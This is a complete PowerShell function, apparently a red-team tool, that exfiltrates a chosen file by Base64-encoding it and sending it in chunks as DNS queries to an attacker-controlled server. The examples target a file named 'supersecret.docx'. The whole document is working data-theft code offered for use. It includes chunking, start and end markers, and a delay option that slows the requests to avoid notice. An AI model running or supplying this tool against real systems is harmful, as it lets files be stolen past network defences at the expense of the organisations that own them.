function Invoke-NotExfiller {
    <#
    .Description
        Function to exfiltrate files to an external server on the DNS protocol.

    .PARAMETER DNSServer
        Define the target server listening on port UDP 53 to send the file to
     
    .PARAMETER File
        The file to send to the external server
     
    .PARAMETER RequestLength
        The number of characters to add in each request to the external server
        Example: Length of 10 results in xxxxxxxxxx.test.local
     
    .PARAMETER Delay 
        Time to wait (in milliseconds) between each request

    .EXAMPLE
        Invoke-NotExfiller -DNSServer 1.1.1.1 -File supersecret.docx

    .EXAMPLE
        Invoke-NotExfiller -DNSServer 1.1.1.1 -File supersecret.docx -RequestLength 50 -Delay 100
    #> 

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)][string]$DNSServer,
        [Parameter(Mandatory=$true)][string]$File,
        [Parameter(Mandatory=$false)][int]$RequestLength,
        [Parameter(Mandatory=$false)][int]$Delay
    )

    # Set default optional values if not set on command line
    if (!$RequestLength) { $RequestLength = 30 }
    if (!$Delay) { $Delay = 0 }

    # Check that RequestLength is at or below the allowed length of 63
    if ($RequestLength -gt 63) { Write-Output "`n[-] Invalid Request Length.  Please choose a value of 63 or lower."}

    # Define target domain to query (Doesn't have to exist)
    $targetDomain = ".test.local"

    # Check the given file path is valid
    If (!(Test-Path $File)) 
    {
        Write-Output "[-] Error accessing file: '$File'!"
        Exit(-1)
    }

    # Get bytes from the target file and convert to Base64
    $fileContentBytes = [System.IO.File]::ReadAllBytes((Convert-Path $File))
    $fileContentB64 = [Convert]::ToBase64String($fileContentBytes)

    # Replace equals with dash to make it URL safe
    $fileContentB64 = $fileContentB64.replace('=', '-')
    $fileContentB64 = $fileContentB64.replace('/', '-0-')
    $fileContentB64 = $fileContentB64.replace('+', '-00-')

    $totalRequests = [Math]::Floor($fileContentB64.Length/$RequestLength)+2

    $stopwatch =  [system.diagnostics.stopwatch]::StartNew()

    Write-Output "`n[*] Sending a total of $totalRequests DNS requests to $DNSServer"

    # Send start of file identifier
    $requestString = "11111" + $File.replace('.', '-').replace('\', '') + "11111" + $targetDomain
    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile

    # Set up counter to count total number of requests
    $counter = 0

    # Loop over Base64 data sending the specific number of characters per request
    for ($i=0; $i -lt $fileContentB64.Length; $i += $RequestLength) {
        try {
            $requestString = $fileContentB64.substring($i, $RequestLength) + $targetDomain
            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
            $counter++
        }
        catch {
            $requestString = $fileContentB64.substring($i) + $targetDomain
            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
            $counter++
        }

        Start-Sleep -Milliseconds $Delay
    }

    # Send end of file identifier
    $requestString = "000000000000000" + $targetDomain
    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile


    $stopwatch.Stop()
    $time = [int]$stopwatch.Elapsed.TotalSeconds
    Write-Output $time

    Write-Output "`n[+] Successfully sent file '$File' over a total of $totalRequests requests to $DNSServer"

    $minutes = [math]::Round($stopwatch.Elapsed.TotalSeconds / 60)
    $seconds = [int]$stopwatch.Elapsed.TotalSeconds % 60

    if ([int]$stopwatch.Elapsed.TotalSeconds -gt 60)
    {
        Write-Output "`n[*] Time elapsed: $minutes minute(s), $seconds seconds"
    }
    else {
        Write-Output "`n[*] Time elapsed: $seconds seconds"
    }

    #### 
    # Below can be used for troubleshooting to ensure the data is converted correctly
    ####
    # $fileContentOriginal = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($fileContentB64))
    # Write-Output "Original: $fileContentOriginal"


}
